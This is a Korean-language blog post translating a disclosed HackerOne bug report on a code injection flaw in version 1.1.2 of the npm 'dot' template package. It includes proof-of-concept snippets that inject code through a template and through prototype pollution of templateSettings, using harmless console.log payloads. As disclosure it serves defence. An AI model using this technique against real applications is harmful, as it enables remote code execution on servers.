---
layout: post
title: dot 패키지의 코드 인젝션 취약점
categories: PoC
tags: [Bugbounty, CodeInjection, Nodejs, Translation, Hackerone]
---
출처 : [hackerone hacktivity, 작성자 : Cristian-Alexandru Staicu (cris_semmle)] https://hackerone.com/reports/390929

_[ 본 이슈는 해결 된 상태이며, 취약점은 한국시각으로 2019년 4월 3일 오후 7시 16분에 공개되었습니다. Node.js third-party modules에 리포팅 되었으며, 소스코드는 dot의 자산입니다. 취약점의 종류는 Code Injection이며, 포상금은 없습니다. 해당 취약점은 해당 도메인에서 7.4/10 정도의 심각성을 내포하고 있습니다. ]_
- - -
저는 dot의 코드 인젝션 취약점에 대해 알리고 싶습니다. 이 취약점은 공격자의 임의 JS코드를 실행시킬 수 있게 해주며 특히, 프로토타입 폴루션 공격과 결합할 때 더 심각한 결과를 초래합니다.

# 모듈
* 모듈 이름: dot
* 버전: 1.1.2
* npm 페이지: https://www.npmjs.com/package/dot
  
## 모듈 설명
V8과 Node.js에서의 퍼포먼스가 강조된 빠르고 간결한 자바스크립트 템플릿 함수를 위해 만들어졌습니다. 이 모듈은 Node.js와 브라우저에서의 좋은 퍼포먼스를 보여줍니다.

doT.js는 디팬던시가 없으며 빠르고 경량입니다

## 모듈 스탯
지난주에 76,838 다운로드 횟수를 기록했습니다.
- - -
# 취약점
## 취약점 설명
dot은 템플릿을 컴파일하기 위해 Function()을 씁니다. 만약 해커가 템플릿을 통제할 수 있다거나 Object.prototype의 값을 통제할 수 있다면 이 부분이 공격당할 수 있습니다.

a) 기본적인 공격 벡터
{% highlight html %}
var doT = require("dot");
var tempFn = doT.template("<h1>Here is a sample template " +
    "{{=console.log(23)}}</h1>");
tempFn({})
{% endhighlight %}


b) 프로토타입 폴루션 공격과 결합할 때
* “resources” 라는 이름의 폴더를 생성한 뒤 다음과 같은 내용을 담고있는 “mytemplate.dot”이라는 파일을 생성합니다 :
{% highlight html %}
html <h1>Here is a sample template</h1>
{% endhighlight %}

* resources 폴더를 포함하는 해당 폴더에서, 다음과 같은 js파일을 생성하고 실행합니다 :
{% highlight html %}
js var doT = require("dot"); // prototype pollution attack vector 
Object.prototype.templateSettings = {varname:"a,b,c,d,x=console.log(25)"}; // benign looking template compilation + application 
var dots = require("dot").process({path: "./resources"}); dots.mytemplate();
{% endhighlight %}
컴파일된 템플릿과 안전해보이는 애플리케이션으로 보인다 할지라도 프로토타입 폴루션 공격 때문에 해커는 임의의 코드를 실행할 수 있습니다.  
- - -
# 패치
Function() call (함수 호출) 제거. N/A(해당 없음)  
- - -
# 지원하는 요소나 레퍼런스
취약점이 발견된 스택에 관련된 기술적인 정보들
* MacOs
* NodeJS v8.12.0
* npm 6.4.1

# 정리
* maintainer가 알 수 있도록 컨택했습니다 : No
* 관련된 리포지토리 안의 정보들을 열람했습니다 : No
  
# 영향
만약 해커가 템플릿을 통제할 수 있거나 만약 Object.prototype에 임의의 것들을 설정할 수 있다면 코드 인젝션이나 RCE(Remote Code Execution)을 수행할 수 있습니다.  
runtime computed values와 함께 Function()을 사용하는 것은 거의 안전하지 않습니다.